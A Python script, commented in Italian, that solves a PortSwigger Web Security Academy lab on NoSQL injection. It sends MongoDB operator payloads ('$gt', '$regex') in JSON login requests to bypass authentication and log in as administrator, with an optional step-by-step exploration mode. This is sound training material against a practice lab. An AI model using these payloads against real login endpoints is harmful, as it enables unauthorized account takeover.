"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
    In modalità esplorazione (3 step) e singola request
"""
import requests
import sys
import json
from urllib.parse import urljoin

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        BLUE = ''
        CYAN = ''
        MAGENTA = ''
    class Style:
        RESET_ALL = ''

def colored(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

def print_error(msg):
    print(colored(msg, Fore.RED))

def print_success(msg):
    print(colored(msg, Fore.GREEN))

def print_info(msg):
    print(colored(msg, Fore.CYAN))

LAB_ID = "YOUR_LAB_ID_HERE"  
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

class NoSQLInjectionExploit:
    def __init__(self, lab_id):
        self.lab_id = lab_id
        self.base_url = f"https://{lab_id}.web-security-academy.net"
        self.session = requests.Session()
        
    def check_lab_status(self):
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                print_success(f"Lab raggiungibile: {self.base_url}")
                return True
            else:
                print_error(f"Lab non raggiungibile (Status: {response.status_code})")
                return False
        except Exception as e:
            print_error(f"Errore connessione: {e}")
            return False
    
    def nosql_login(self, payload, description):
        print_info(f"\n{description}")
        print(f"Payload: {json.dumps(payload, indent=2)}")
        
        login_url = urljoin(self.base_url, "/login")
        
        headers = {
            "Content-Type": "application/json"
        }
        
        try:
            response = self.session.post(
                login_url, 
                json=payload, 
                headers=headers,
                allow_redirects=True
            )
            
            if response.status_code == 200 and ("My account" in response.text or "Log out" in response.text):
                print_success("\nLogin riuscito!")
                
                if "administrator" in response.text.lower() or "admin" in response.text.lower():
                    print_success("Loggato come ADMINISTRATOR!")
                elif "wiener" in response.text.lower():
                    print_success("Loggato come utente 'wiener'")
                else:
                    print_success("Login completato")
                
                return True
            else:
                print_error(f"Login fallito (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print_error(f"Errore durante il login: {e}")
            return False
    
    def solve_lab(self):
        """Risolve il lab con la sequenza corretta di exploit"""
        print("\n" + "="*60)
        print("SOLUZIONE LAB: NoSQL Injection Authentication Bypass")
        print("="*60)
        
        payload_admin = {
            "username": {"$regex": "admin.*"},
            "password": {"$gt": ""}
        }
        
        success = self.nosql_login(
            payload_admin,
            "Login come administrator usando NoSQL regex injection"
        )
        
        if success:
            return self.verify_solution()
        else:
            print_error("\n[-] Exploit fallito")
            return False
    
    def explore_vulnerability(self):
        print("\n" + "="*60)
        print("ESPLORAZIONE VULNERABILITÀ (Educational)")
        print("="*60)

        print("\nSTEP 1 - Test: Bypass senza conoscere lo username")
        payload1 = {
            "username": {"$gt": ""},
            "password": "peter"
        }
        self.nosql_login(payload1, "Tentativo con $gt per username")
        
        self.session = requests.Session()
        
        print("\nSTEP 2 - Test: Bypass conoscendo solo lo username")
        payload2 = {
            "username": "wiener",
            "password": {"$gt": ""}
        }
        self.nosql_login(payload2, "Tentativo con $gt per password")

        self.session = requests.Session()

        print("\nSTEP 3 -Test: Login come administrator")
        payload3 = {
            "username": {"$regex": "admin.*"},
            "password": {"$gt": ""}
        }
        self.nosql_login(payload3, "Tentativo con regex per trovare admin")
    
    def verify_solution(self):
        """Verifica se il lab è stato risolto"""
        print_info("\nVerifica soluzione del lab...")
        
        try:
            response = self.session.get(self.base_url)
            
            if "Congratulations, you solved the lab!" in response.text:
                print_success("\n" + "="*60)
                print_success("LAB RISOLTO CON SUCCESSO!")
                print_success("="*60)
                return True
            else:
                print_error("Lab non ancora risolto")
                return False
                
        except Exception as e:
            print(f"Errore verifica: {e}")
            return False

def main():
    if LAB_ID == "YOUR_LAB_ID_HERE":
        print_error("\nERRORE: Devi impostare il LAB_ID nello script!")
        print_info("Esempio: LAB_ID = '0a12003404bd3fe180f562b700ab0012'")
        sys.exit(1)
    
    exploit = NoSQLInjectionExploit(LAB_ID)
    
    if not exploit.check_lab_status():
        sys.exit(1)

    print("\nVuoi vedere l'esplorazione progressiva della vulnerabilità?")
    print("    1 - Risolvi il lab")
    print("    2 - Mostra esplorazione e risolvi ")
    
    choice = input("\nScelta [1/2] (default=1): ").strip() or "1"
    
    if choice == "2":
        exploit.explore_vulnerability()
        print("\n" + "="*60)
        print("Procedo con la soluzione finale...")
        print("="*60)
        exploit.session = requests.Session()
    
    if not exploit.solve_lab():
        sys.exit(1)

if __name__ == "__main__":
    main()